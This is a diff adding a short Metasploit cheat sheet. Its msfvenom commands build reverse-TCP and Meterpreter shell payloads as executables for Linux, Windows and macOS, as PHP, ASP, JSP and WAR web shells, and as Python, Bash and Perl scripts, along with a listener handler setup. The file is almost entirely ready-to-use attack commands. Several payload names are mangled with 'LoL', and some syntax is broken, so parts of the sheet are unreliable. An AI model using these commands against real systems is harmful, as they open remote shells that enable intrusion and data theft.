@@ -1,0 +1,65 @@
+List payloads
+msfvenom -l
+
+Handlers
+
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST local_ip
+set LPORT local_lisening_port
+set ExitOnSession false
+exploit -j -z
+
+Creating Binaries
+
+Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=Port -f elf > LoL.elf
+
+Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=port -f exe > lol.exe
+
+Mac
+msfvenom -p osx/x86/LoL_reverse_tcp LHOST=IP LPORT=Port -f macho > LoL.macho
+
+
+Creating Web Payloads
+
+PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=ip LPORT=port -f raw > LoL.php
+cat LoL.php | pbcopy && echo '<?php ' | tr -d '\n' > LoL.php && pbpaste >> LoL.php
+
+ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f asp > LoL.asp
+
+JSP
+msfvenom -p java/jsp_LoL_reverse_tcp LHOST=ip LPORT=port -f raw > LoL.jsp
+
+WAR
+msfvenom -p java/jsp_LoL_reverse_tcp LHOST=ip LPORT=port -f war > LoL.war
+
+
+Scripting Payloads
+
+Python
+msfvenom -p cmd/unix/reverse_python LHOST=ip LPORT=port -f raw > LoL.py
+
+Bash
+msfvenom -p cmd/unix/reverse_bash LHOST=ip LPORT=port -f raw > LoL.sh
+
+Perl
+msfvenom -p cmd/unix/reverse_perl LHOST=ip LPORT=port -f raw > LoL.pl
+
+
+Tha LoLcode
+
+msfvenom –help-formats
+
+Linux Based LoLcode
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=host> LPORT=port -f <language>
+
+Windows Based LoLcode
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f <language>
+
+Mac Based LoLcode
+msfvenom -p osx/x86/LoL_reverse_tcp LHOST=ip LPORT=port -f <language>
+
